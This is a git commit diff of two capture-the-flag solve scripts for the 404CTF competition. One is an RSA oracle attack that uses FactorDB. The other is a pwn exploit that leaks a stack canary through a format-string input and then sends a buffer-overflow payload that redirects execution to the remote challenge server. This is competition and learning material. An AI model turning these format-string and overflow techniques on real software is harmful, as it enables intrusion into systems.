6c5f87d624d3efee7bb06487468a6d0e383f0599
AlexisPin <pinceminalexis@gmil.com>
2023-08-02 12:50:49 -0400

    ctf

--- 404CTF/crypto/Oracle/solve.py
+++ 404CTF/crypto/Oracle/solve.py
@@ -8,8 +8,9 @@ import gmpy2
 from tqdm import tqdm
 import os
 import re
-
-e = 65537
+import time
+from factordb.factordb import FactorDB
+e = 0x10001
 REMOTE = 'challenges.404ctf.fr'
 PORT = '31674'
 
@@ -17,22 +18,53 @@ N = []
 C = []
 
 while True:
-  for _ in tqdm(range(3)):
-    #r = pwn.remote(REMOTE,PORT)
-    r = pwn.process('./oracle.py')
+  for _ in tqdm(range(1)):
+    r = pwn.remote(REMOTE,PORT)
+    #r = pwn.process('./oracle.py')
 		
     r.recvuntil(b'l\'oracle!:\n')
-    flag_ = int(r.recvline())
+    flag_ = r.recvline().rstrip()
+    
 
     n_line = r.recvline().decode('utf-8')
     n_match = re.search(r"n°(0x[0-9a-f]+)", n_line)
     n = int(n_match.group(1), 16)
+    
+    f = FactorDB(n)
+    primes = f.get_factor_list()
+    while primes == []:
+     r = pwn.remote(REMOTE,PORT)
+     #r = pwn.process('./oracle.py')
+		
+     r.recvuntil(b'l\'oracle!:\n')
+     flag_ = r.recvline().rstrip()
+    
 
-    C.append(flag_)
+     n_line = r.recvline().decode('utf-8')
+     n_match = re.search(r"n°(0x[0-9a-f]+)", n_line)
+     n = int(n_match.group(1), 16)
+     f = FactorDB(n)
+     primes = f.get_factor_list()
+     r.close()
+    
+    print(n)
+    print(flag_)
+    
+    i = 1
+    r.sendlineafter(b"oracle?\n", flag_[i:])
+    ct = int(r.recvline().rstrip())
+    pt = long_to_bytes(ct)
+    while b"404CTF" not in pt:
+     r.sendlineafter(b"oracle?\n", flag_[i:])
+     ct = int(r.recvline().rstrip())
+     i = i + 1
+     pt = long_to_bytes(ct)
+     
+     
+    print(pt)
+
+    C.append(int(flag_))
     N.append(n)
-    print(C)
-    print('\n')
-    print(N)
     r.close()
 
   m = crt(N,C)[0]
--- 404CTF/pwn/la_cohue_/solve.py
+++ 404CTF/pwn/la_cohue_/solve.py
@@ -2,47 +2,27 @@
 
 from pwn import *
 
-def start(argv=[], *a, **kw):
-	if args.GDB:
-		return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
-	elif args.REMOTE:
-		return remote(sys.argv[1], sys.argv[2], *a, **kw)
-	else:
-		return process([exe] + argv, *a, **kw)
-		
-gdbscript='''
-b *0x400aa0
-b *0x400ac2
-b *0x400a34
-canary
-continue
-'''.format(**locals())
+elf = context.binary = ELF('./la_cohue')
 
-exe = "./la_cohue"
-context.binary = elf = ELF(exe, checksec=False)
+#p = process()
+p = remote('challenges.404ctf.fr', 30223)
 
-context.log_level = 'debug'
+p.clean()
+p.sendline(b'2')
+p.sendline(b'%17$p')
+p.recvuntil(b'>>>')
+canary = int(p.recvuntil(b'\n')[9:-1], 16)
+log.info(f'canary: {hex(canary)}')
 
-io = start()
+p.clean()
+p.sendline(b'1')
+p.clean()
 
-offset = 72
+payload = b'A'*72 + p64(canary) + b'\x90'*8 + p64(elf.symbols['canary'])
 
-io.sendlineafter(b">>> ", b"2", timeout=1)
-io.sendline(b"%25$p")
-io.recvuntil(b'[Vous] : ')
-canary = int(io.recvline().strip(),16)
-info('canary = 0x%x (%d)', canary, canary)
-payload = flat([
-		offset * b'A',
-		canary,
-		8 * b'A',
-		elf.symbols.canary
-])
+p.sendline(payload)
+p.recvuntil(b'>>>')
+p.sendline(b'3')
 
-io.sendlineafter(b">>> ", b"1", timeout=1)
-io.sendlineafter(b"[Vous] : ", payload, timeout=1)
-
-io.interactive()
-
-
-
+p.recvline()
+print(p.recvline())
